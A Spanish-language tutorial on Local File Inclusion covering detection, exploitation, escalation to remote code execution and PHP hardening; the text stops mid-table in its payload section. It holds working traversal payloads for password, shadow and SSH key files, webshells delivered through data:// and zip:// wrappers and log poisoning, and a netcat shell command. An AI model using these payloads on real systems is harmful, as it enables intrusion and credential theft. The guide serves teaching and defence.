# 🔐 **Rearme: Guía Definitiva de Local File Inclusion (LFI)**
*Un manual práctico para entender, detectar y mitigar esta vulnerabilidad crítica*

---

## 📌 **Tabla de Contenidos**
1. [Definición y Concepto Fundamental](#definición)
2. [Descubrimiento y Detección](#descubrimiento)
3. [Técnicas de Explotación Avanzadas](#explotación)
4. [Escalada a RCE (Remote Code Execution)](#rce)
5. [Impacto y Riesgos](#impacto)
6. [Prevención y Mitigación](#prevención)
7. [Comandos y Payloads para Explotación](#comandos)
8. [Preguntas Frecuentes (FAQ)](#faq)
9. [Recursos y Herramientas](#recursos)

---

## 🎯 **1. Definición y Concepto Fundamental** {#definición}

**Local File Inclusion (LFI)** es una vulnerabilidad de seguridad web que permite a un atacante **incluir archivos locales** en la aplicación mediante la manipulación de parámetros (URL, formularios, cookies), **sin validación adecuada**.

### 🔍 **Diferencias clave con RFI**
| **LFI** | **RFI** |
|---------|---------|
| Carga archivos **locales** del servidor | Carga archivos **remotos** (desde otros servidores) |
| Limitado al sistema de archivos del servidor | Puede ejecutar código arbitrario desde servidores externos |
| Ejemplo: `include("archivo.php")` | Ejemplo: `include("http://malicious.com/shell.txt")` |
| **Más común** en entornos reales | **Menos común** por configuraciones seguras por defecto |

### ⚙️ **Causa Raíz**
- **Falta de saneamiento** en funciones de PHP como:
  ```php
  include(), require(), include_once(), require_once()
  fopen(), file_get_contents(), file(), readfile()
  highlight_file(), show_source()
  ```
- **Entrada del usuario sin filtrar** en rutas de archivos.
- **Configuración insegura** de PHP (`allow_url_include = On`).

### 🎯 **Mecánica de Ataque**
1. El atacante envía una solicitud con un parámetro manipulado:
   ```
   http://ejemplo.com/index.php?page=../../../etc/passwd
   ```
2. La aplicación **incluye el archivo** sin validar la ruta.
3. El servidor **devuelve el contenido** del archivo (o lo ejecuta si es PHP).

---

## 🔍 **2. Descubrimiento y Detección** {#descubrimiento}

### 🔎 **Pruebas Manuales**
- **Inyectar valores aleatorios** en parámetros sospechosos:
  ```
  http://ejemplo.com/?page=valor_inexistente
  ```
- **Buscar errores típicos**:
  ```
  Warning: include(./valor_inexistente): failed to open stream...
  Warning: include(): Failed opening '...' for inclusion...
  ```

### 🤖 **Escaneo Automatizado (DAST)**
Herramientas recomendadas para pruebas dinámicas:
- **OWASP ZAP** (Escaneo dinámico con reglas personalizadas)
- **Burp Suite** (Interceptación y pruebas manuales con Repeater)
- **Acunetix / Invicti** (Escaneo profesional con informes detallados)
- **Nuclei** (Escaneo rápido con plantillas específicas para LFI)
  ```bash
  nuclei -u "http://ejemplo.com" -t ~/nuclei-templates/vulnerabilities/file-inclusion/
  ```
- **Fuzzing con `ffuf` o `wfuzz`**:
  ```bash
  ffuf -u "http://ejemplo.com/?page=FUZZ" -w /path/to/wordlist.txt -mr "root:x:"
  ```

### 📜 **Análisis Estático (SAST)**
- Revisar el código en busca de:
  ```php
  $page = $_GET['page'];
  include($page);  // ❌ Vulnerable
  ```
- Buscar **"sinks"** (puntos donde se usan funciones de inclusión sin filtrado).
- Herramientas:
  - **SonarQube**
  - **PHPStan**
  - **RIPS** (Análisis estático para PHP)

---

## ⚔️ **3. Técnicas de Explotación Avanzadas** {#explotación}

### 🚪 **A. Directory Traversal (Salto de Directorio)**
**Objetivo**: Acceder a archivos del sistema operativo.

| **Sistema** | **Payload** | **Archivo Objetivo** |
|-------------|------------|----------------------|
| Linux | `../../../../etc/passwd` | Lista de usuarios |
| Linux | `../../../../etc/shadow` | Hashes de contraseñas (requiere permisos) |
| Linux | `../../../../etc/hosts` | Configuración de red |
| Linux | `../../../../proc/self/environ` | Variables de entorno (puede contener credenciales) |
| Linux | `../../../../var/log/auth.log` | Logs de autenticación |
| Windows | `C:\WINDOWS\win.ini` | Configuración del sistema |
| Windows | `%WINDIR%\win.ini` | Ruta dinámica |
| Windows | `%SYSTEMDRIVE%\boot.ini` | Archivo de arranque |

**Bypass de filtros**:
- **Alternar `/` y `\`**:
  ```
  ....//....//....//etc/passwd
  ```
- **Codificación URL**:
  ```
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  ```
- **Codificación doble**:
  ```
  %252e%252e%252f%252e%252e%252fetc%252fpasswd
  ```
- **Secuencias alternativas**:
  ```
  ./.././.././../etc/passwd
  /var/www/html/../../../../etc/passwd
  ```

---

### 🛡️ **B. Evasión de Filtros (Bypasses)**
| **Técnica** | **Payload** | **Descripción** | **Versión PHP afectada** |
|-------------|------------|----------------|--------------------------|
| **Null Byte Injection** | `../../../../etc/passwd%00` | Ignora extensiones añadidas automáticamente | < 5.3.4 |
| **Codificación URL** | `%2e%2e%2f` | Equivalente a `../` | Todas |
| **Codificación doble** | `%252e%252e%252f` | Bypass para WAFs que decodifican una vez | Todas |
| **Truncamiento** | Ruta > 4096 bytes | Elimina extensiones no deseadas | Todas |
| **Inclusión de archivos vacíos** | `../../../../etc/passwd/.` | Algunos filtros no manejan rutas con `.` | Todas |
| **Uso de parámetros alternativos** | `?file=php://filter/...` | Bypass de filtros de parámetros | Todas |

---

### 🧩 **C. PHP Wrappers (Protocolos Avanzados)**
Permiten **leer, ejecutar o manipular archivos** de formas creativas.

| **Wrapper** | **Sintaxis** | **Uso** | **Requisitos** |
|-------------|-------------|---------|----------------|
| **`php://filter`** | `php://filter/convert.base64-encode/resource=index.php` | Lee código fuente de archivos PHP (codificado en Base64) | Todas |
| **`data://`** | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==` | Ejecuta código PHP directamente | `allow_url_include = On` |
| **`zip://`** | `zip://archivo.zip#shell.php` | Ejecuta código PHP oculto en un ZIP (ej. subido como `.jpg`) | Todas |
| **`expect://`** | `expect://id` | Ejecuta comandos del sistema | Módulo `expect` instalado (poco común) |
| **`php://input`** | Enviar código en POST | Ejecuta datos enviados en el cuerpo de la petición | Todas |
| **`phar://`** | `phar://archivo.phar/shell.php` | Ejecuta código PHP en archivos PHAR | Todas |
| **`file://`** | `file:///etc/passwd` | Acceso directo a archivos locales | Todas |

**Ejemplo de `php://filter`**:
```bash
curl "http://ejemplo.com/?page=php://filter/convert.base64-encode/resource=config.php"
```
→ Devuelve el código de `config.php` en Base64.

**Ejemplo de `data://`**:
```bash
curl "http://ejemplo.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnKTsgPz4="
```
→ Ejecuta `system($_GET['cmd'])` si `allow_url_include` está activado.

**Ejemplo de `zip://`**:
1. Subir un archivo ZIP con un shell PHP:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   zip shell.jpg shell.php
   ```
2. Incluirlo vía LFI:
   ```
   ?page=zip://uploads/shell.jpg%23shell.php&cmd=id
   ```

---

## 🚀 **4. Escalada a RCE (Remote Code Execution)** {#rce}

El LFI puede ser el **primer paso** para tomar control total del servidor.

### 📜 **Log Poisoning (Envenenamiento de Logs)**
1. **Inyectar código malicioso** en un campo que se registre (ej. `User-Agent`):
   ```bash
   curl -H "User-Agent: <?php system($_GET['cmd']); ?>" http://target.com
   ```
2. **Incluir el archivo de log** vía LFI:
   ```
   http://ejemplo.com/?page=/var/log/apache2/access.log&cmd=whoami
   ```
3. **Ejecutar comandos**:
   ```
   &cmd=id
   &cmd=ls -la
   &cmd=nc -lvp 4444 -e /bin/bash  # Reverse Shell
   ```
4. **Archivos de log comunes**:
   - `/var/log/apache2/access.log`
   - `/var/log/nginx/access.log`
   - `/var/log/auth.log`
   - `/var/log/syslog`

### 📁 **Abuso de Archivos Subidos**
- Subir un archivo (ej. `.jpg`) con código PHP oculto.
- Usar LFI para forzar su ejecución:
  ```
  zip://uploads/shell.jpg%23shell.php
  phar://uploads/shell.phar/shell.php
  ```

### 🔑 **Lectura de Claves SSH**
- Obtener el archivo `id_rsa`:
  ```
  ../../../../home/usuario/.ssh/id_rsa
  ```
- Usar la clave para conectarse:
  ```bash
  chmod 600 id_rsa
  ssh -i id_rsa usuario@ip_servidor
  ```

### 🔐 **Acceso a Bases de Datos**
- Leer archivos de configuración:
  ```
  ../../../../var/www/html/config.php
  ../../../../etc/mysql/my.cnf
  ```
- Ejecutar consultas SQL si se encuentra credenciales:
  ```php
  <?php
  $conn = new mysqli("localhost", "user", "pass", "db");
  $result = $conn->query("SELECT * FROM users");
  ?>
  ```

### 📂 **Movimiento Lateral**
- Leer archivos de configuración de otros servicios:
  ```
  ../../../../etc/nginx/nginx.conf
  ../../../../etc/apache2/apache2.conf
  ../../../../etc/hosts
  ```
- Acceder a archivos de otros usuarios:
  ```
  ../../../../home/usuario/.bashrc
  ../../../../home/usuario/.ssh/authorized_keys
  ```

---

## ⚠️ **5. Impacto y Riesgos** {#impacto}

| **Riesgo** | **Consecuencia** | **Impacto** |
|------------|------------------|-------------|
| 🔐 **Divulgación de información** | Acceso a archivos `.env`, `.git/`, `config.php`, `wp-config.php` | Alto |
| 💥 **RCE (Remote Code Execution)** | Toma de control total del servidor | Crítico |
| 📱 **Aplicaciones móviles** | Exposición de datos de usuarios en WebView (Android/iOS) | Medio-Alto |
| 🔑 **Acceso a bases de datos** | Robo de credenciales y datos sensibles | Alto |
| 🌐 **Movimiento lateral** | Compromiso de otros sistemas en la red | Crítico |
| 📂 **Acceso a archivos del sistema** | Lectura de archivos críticos (`/etc/passwd`, `/etc/shadow`) | Alto |
| 🔄 **Persistencia** | Creación de backdoors o usuarios maliciosos | Crítico |

---

## 🛡️ **6. Prevención y Mitigación** {#prevención}

### ✅ **Medidas de Prevención**
1. **Evitar inclusiones dinámicas**:
   ```php
   // ❌ MALO
   $page = $_GET['page'];
   include($page);

   // ✅ BUENO
   $allowed_pages = ['home.php', 'about.php', 'contact.php'];
   $page = isset($_GET['page']) && in_array($_GET['page'], $allowed_pages) ? $_GET['page'] : 'home.php';
   include("pages/" . $page);
   ```

2. **Listas blancas (Allowlists)**:
   - Definir una lista estricta de archivos permitidos.
   - Ejemplo:
     ```php
     $allowed_pages = ['home.php', 'about.php', 'products.php'];
     if (!in_array($_GET['page'], $allowed_pages)) {
         die("Acceso denegado");
     }
     ```

3. **Referencias indirectas**:
   - Usar identificadores numéricos en lugar de nombres de archivos:
     ```php
     $page_id = $_GET['id'];
     $pages = [
         1 => 'home.php',
         2 => 'about.php',
         3 => 'contact.php'
     ];
     $page = $pages[$page_id] ?? 'home.php';
     include("pages/" . $page);
     ```

4. **Saneamiento estricto**:
   - Eliminar caracteres peligrosos:
     ```php
     $page = str_replace(['../', './', '\\'], '', $_GET['page']);
     $page = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $page);
     ```

5. **Configuración segura de PHP**:
   - **Deshabilitar** en `php.ini`:
     ```ini
     allow_url_fopen = Off
     allow_url_include = Off
     disable_functions = exec,passthru,shell_exec,system
     open_basedir = /var/www/html
     expose_php = Off
     ```

6. **Principio de mínimo privilegio**:
   - Ejecutar el servidor web con un usuario limitado (`www-data`, `nginx`).
   - Usar entornos aislados: `chroot`, contenedores (Docker), sandboxes.
   - Ejemplo de contenedor seguro:
     ```dockerfile
     FROM php:7.4-apache
     RUN chown -R www-data:www-data /var/www/html
     USER www-data
     ```

7. **Validación de entrada**:
   - Usar funciones como `filter_var()` y `filter_input()`:
     ```php
     $page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING);
     ```

8. **Uso de frameworks modernos**:
   - Frameworks como **Laravel**, **Symfony** o **Drupal** incluyen protecciones contra LFI por defecto.

### 🔧 **Herramientas para Mitigación**
| **Herramienta** | **Uso** |
|----------------|---------|
| **PHP Secure Headers** | Añade encabezados de seguridad como `X-Content-Type-Options`, `X-Frame-Options` |
| **ModSecurity (WAF)** | Bloquea payloads de LFI con reglas personalizadas |
| **Fail2Ban** | Protege contra ataques repetidos bloqueando IPs |
| **SonarQube / PHPStan** | Detecta código vulnerable en SAST |
| **PHP-Suhosin** | Hardening para PHP con protección contra LFI |
| **AppArmor / SELinux** | Restringe los permisos del proceso web |

---

## 💻 **7. Comandos y Payloads para Explotación** {#comandos}

### 1️⃣ **Payloads de Salto de Directorio**

**Linux**:
```
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../etc/group
../../../../proc/self/environ
../../../../var/log/auth.log
../../../../var/log/syslog
```

**Windows**:
```
../../../../windows/win.ini
C:\WINDOWS\win.ini
%WINDIR%\win.ini
%SYSTEMDRIVE%\boot.ini
C:\Windows\System32\drivers\etc\hosts
```

---

### 2️⃣ **Evasión de Filtros**

| **Técnica** | **Payload** | **Descripción** |
|-------------|------------|----------------|
| **Null Byte** | `../../../../etc/passwd%00` | Ignora extensiones (PHP < 5.3.4) |
| **Codificación URL**
